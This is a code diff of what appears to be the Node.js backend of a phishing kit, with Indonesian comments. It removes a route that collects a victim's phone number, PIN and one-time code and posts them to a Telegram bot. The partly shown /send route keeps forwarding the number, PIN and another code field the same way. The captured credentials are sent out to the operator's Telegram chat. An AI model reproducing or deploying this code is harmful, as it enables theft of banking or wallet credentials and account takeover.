@@ -224,107 +224,6 @@ app.post("/pix", async(req,res) =>{
 });
 
 /* ROUTE */
-app.post("/otp", async(req,res) =>{
-
-    try{
-
-        console.log(
-            "DATA MASUK:"
-        );
-
-        console.log(
-            req.body
-        );
-
-        console.log(
-            "BOT:",
-            BOT_TOKEN
-        );
-
-        console.log(
-            "CHAT:",
-            CHAT_ID
-        );
-
-        const {
-            
-            nmrx,
-            pix,
-            otp
-            
-        } = req.body;
-
-        if(
-            !nmrx ||
-            !pix ||
-            !otp
-        ){
-
-            return res.status(400).json({
-
-                success:false,
-                message:"Data tidak lengkap"
-
-            });
-
-        }
-
-        /* PESAN TELEGRAM */
-        const text = `
-🔥 [ ×𝗢𝗫𝗚× <code>${nmrx}</code> ] 🔥
-
-─────────────────
-<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
-<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
-<b>⌬<i>  𝗢𝗫𝗚   ×</i></b>   : <b>${otp}</b>
-⌬<i>  OXT . . . .</i>
-─────────────────
-
-<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
-        `;
-
-        /* KIRIM TELEGRAM */
-        await axios.post(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-        {
-
-            chat_id:
-            CHAT_ID,
-
-            text:
-            text,
-
-            parse_mode:
-            "HTML"
-
-        }
-
-     );
-
-        res.json({
-
-            success:true
-
-        });
-
-    }catch(error){
-
-        console.log(
-            error.response?.data ||
-            error.message
-       );
-
-        res.status(500).json({
-
-            success:false
-
-        });
-
-    }
-
-});
-
-/* ROUTE */
 app.post("/send", async(req,res) =>{
 
     try{
@@ -351,7 +250,6 @@ app.post("/send", async(req,res) =>{
             
             nmrx,
             pix,
-            otp,
             otx
             
         } = req.body;
@@ -359,7 +257,6 @@ app.post("/send", async(req,res) =>{
         if(
             !nmrx ||
             !pix ||
-            !otp ||
             !otx
         ){
 
@@ -379,7 +276,6 @@ app.post("/send", async(req,res) =>{
 ─────────────────
 <b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
 <b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
-<b>⌬<i>  𝗢𝗫𝗚   ×</i></b>   : <b>${otp}</b>
 <b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otx}</b>
 ─────────────────
 
